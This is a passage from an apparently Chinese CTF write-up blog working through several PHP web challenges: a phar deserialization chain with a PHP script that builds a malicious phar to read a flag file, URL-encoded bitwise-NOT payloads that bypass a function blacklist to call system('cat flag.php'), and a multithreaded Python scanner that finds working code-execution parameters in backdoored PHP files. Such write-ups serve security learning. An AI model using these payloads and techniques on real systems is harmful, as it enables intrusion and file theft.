    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>copy<span class="token punctuation">;</span> <span class="token number">2018</span><span class="token operator">-</span><span class="token number">2019</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>toast-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/toast.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>


<span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 20 &amp;&amp; $u-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>其中发现class.php的File类中的close()内存在file_get_contents()可能读取文件。</p>
<p><img src="https://s1.ax1x.com/2020/09/27/0APckt.png" srcset="/img/loading.gif" alt="0APckt.png"></p>
<p>继续向上跟踪，看见User类中调用了一个close()。那么如果db变量是File对象，再传下$filename，就可以直接调用File中的close()进行文件读取。但这样并没有可输出数据的地方。</p>
<p><a href="https://imgchr.com/i/03Zkhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/03/03Zkhn.png" srcset="/img/loading.gif" alt="03Zkhn.png"></a></p>
<p>曲线救国，看到了FileList类。                                       </p>
<p>首先FileList对象中存在__call方法，当我们调用不存在的方法时会自动调用它。</p>
<p>本题中__call方法的作用就是遍历所有文件去调用刚刚的方法，并将结果存储在以filename为一级键名，方法为二级键名的数组result中。</p>
<p><a href="https://imgchr.com/i/08jHBt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/08jHBt.png" srcset="/img/loading.gif" alt="08jHBt.png"></a>        </p>
<p>而在销毁时会输出变量$table，$table中存在$results参数。</p>
<p><a href="https://imgchr.com/i/08v2Ks" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/08v2Ks.png" srcset="/img/loading.gif" alt="08v2Ks.png"></a></p>
<p>综上所述。构造思路为：</p>
<p>构建 一个User对象，使它的$db为FileList对象。在User类析构时，因为调用不到close()，就会执行__call方法既而实现执行File类内的close()。这个结果会存入result并被加入table输出。</p>
<p>之后再利用phar伪协议进行利用。这个执行选在delete.php，是因为download.php多了下面这行代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>它限制了只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。</p>
<p>exp:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">FileList</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>剩下的流程就是抓包传test.phar，改个Content-Type成png，上传成功；之后在delete页面filename传参phar://test.png得到flag。</p>
<p><a href="https://imgchr.com/i/0GJZJP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0GJZJP.png" srcset="/img/loading.gif" alt="0GJZJP.png"></a></p>
<h1 id="2020-第五空间智能安全大赛-Web-hate-php"><a href="#2020-第五空间智能安全大赛-Web-hate-php" class="headerlink" title="2020-第五空间智能安全大赛-Web-hate-php"></a>2020-第五空间智能安全大赛-Web-hate-php</h1><p><a href="https://imgchr.com/i/0G0ozn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0G0ozn.png" srcset="/img/loading.gif" alt="0G0ozn.png"></a></p>
<p>可以看见先是用preg_match对参数code做了很多过滤，</p>
<p>后面又用到</p>
<pre><code> $blacklist = get_defined_functions()[&#39;internal&#39;];</code></pre><p>把内置函数加到黑名单里了。</p>
<p>抓了个包看到PHP/7.4.5，php7后可以用  <strong>($a)();</strong> 这种方式执行动态函数。</p>
<p>如</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'phphinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出</span>
<span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span></code></pre>
<p>payload：?code = (~%8F%97%8F%96%91%99%90)()</p>
<p>就能读到phpinfo。</p>
<p>结合取反构造exp:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'print_r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'scandir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//payload:  ?code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((~%D1)))</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出</span>
<span class="token comment" spellcheck="true">//payload:  ??code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)</span></code></pre>
<h1 id="强网杯-2019-Web-高明的黑客"><a href="#强网杯-2019-Web-高明的黑客" class="headerlink" title="强网杯-2019-Web-高明的黑客"></a>强网杯-2019-Web-高明的黑客</h1><p>题目一上来给了网站的/src源码，三千多个文件；</p>
<p>文件中有很多可利用函数，但需要寻找能正常传参的文件及参数。</p>
<p>#整体思路：先一次性发起请求测试哪些文件的GET和POST的传参是可用的，再在这基础上区分是POST还是GET。<br>这样的思路加多线程可以很好的节约时间。</p>
<p>参考：<a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940</a></p>
<p>具体脚本如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>                             
filePath <span class="token operator">=</span> r<span class="token string">"D:\phpstudy_pro\WWW\src"</span>
os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#改变当前的路径</span>
requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">10</span>                  <span class="token comment" spellcheck="true">#设置重连次数</span>
files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#返回path内全部文件及目录名的数组</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>  

<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span>file<span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#提取所有的$_GET和$_POST的参数</span>
            gets <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            posts <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#POST</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#GET</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'echo("dwm2");'</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'echo("dwm2");'</span>
    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span><span class="token operator">+</span>file                      
    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一次性请求所有的GET和POST的方法</span>
    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                              
    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token comment" spellcheck="true">#print(content)  </span>
    <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>          
        flag <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">'echo("dwm2");'</span><span class="token punctuation">)</span>
            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
            <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token number">1</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token string">'echo("dwm2");'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
                <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#flag用来判断参数是GET还是POST</span>
            param <span class="token operator">=</span> <span class="token string">"get-"</span><span class="token operator">+</span>a
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            param <span class="token operator">=</span> <span class="token string">"post-"</span><span class="token operator">+</span>b
        end <span class="token operator">=</span> <span class="token string">"文件："</span><span class="token operator">+</span>file<span class="token operator">+</span><span class="token string">"参数："</span><span class="token operator">+</span>param
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span> 

    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                                                         <span class="token comment" spellcheck="true">#多线程</span>
    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>跑完得到结果</p>
<p><a href="https://imgchr.com/i/0JFpOU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0JFpOU.png" srcset="/img/loading.gif" alt="0JFpOU.png"></a></p>
<p>直接传参得到flag。</p>
<p><a href="https://imgchr.com/i/0JknCn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0JknCn.png" srcset="/img/loading.gif" alt="0JknCn.png"></a></p>
<h1 id="2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload"><a href="#2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload" class="headerlink" title="2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload"></a>2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload</h1><p> <strong>考点：session,代码审计</strong></p>
<p>直接给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string">"/var/babyctf/"</span><span class="token punctuation">.</span><span class="token variable">$attr</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//文件夹路径</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token operator">===</span><span class="token string">"private"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$dir_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//路径为/var/babyctf/private/username</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//判断文件是否是通过 HTTP POST 上传的</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename</span>
        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
